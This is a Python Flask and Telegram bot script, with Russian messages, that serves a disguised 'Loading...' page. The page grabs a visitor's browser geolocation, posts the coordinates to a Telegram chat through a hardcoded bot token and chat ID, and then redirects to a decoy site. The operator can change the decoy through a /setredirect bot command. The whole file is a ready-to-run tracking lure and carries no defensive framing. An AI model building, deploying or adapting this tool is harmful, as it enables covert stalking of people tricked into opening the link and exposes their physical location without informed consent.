from flask import Flask, request, render_template_string
import requests
import telebot
import threading
import os

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'
CHAT_ID = 651911888
REDIRECT_FILE = 'redirect_url.txt'

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)

def get_redirect_url():
    try:
        with open(REDIRECT_FILE, 'r') as f:
            url = f.read().strip()
            if url:
                return url
    except FileNotFoundError:
        pass
    return 'https://yandex.ru'  # URL по умолчанию

def set_redirect_url(url):
    with open(REDIRECT_FILE, 'w') as f:
        f.write(url)

def send_to_telegram(lat, lon):
    text = f"📍 Новая геолокация:\nШирота: {lat}\nДолгота: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    url = get_redirect_url()
    html = f'''
    <!DOCTYPE html>
    <html>
    <head><title>Загрузка...</title></head>
    <body>
    <script>
    navigator.geolocation.getCurrentPosition(pos => {{
        fetch('/send_location', {{
            method: 'POST',
            headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
            }})
        }});
        setTimeout(() => {{
            window.location.href = "{url}";
        }}, 1500);
    }}, err => {{
        setTimeout(() => {{
            window.location.href = "{url}";
        }}, 1500);
    }});
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get('latitude')
    lon = data.get('longitude')
    if lat and lon:
        send_to_telegram(lat, lon)
        return {'status': 'ok'}
    return {'status': 'error'}, 400

@bot.message_handler(commands=['setredirect'])
def cmd_setredirect(message):
    args = message.text.split(maxsplit=1)
    if len(args) == 2:
        url = args[1].strip()
        if url.startswith('http://') or url.startswith('https://'):
            set_redirect_url(url)
            bot.reply_to(message, f"✅ Редирект установлен на:\n{url}")
        else:
            bot.reply_to(message, "❌ Ошибка: ссылка должна начинаться с http:// или https://")
    else:
        bot.reply_to(message, "Использование:\n/setredirect https://example.com")

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=port)
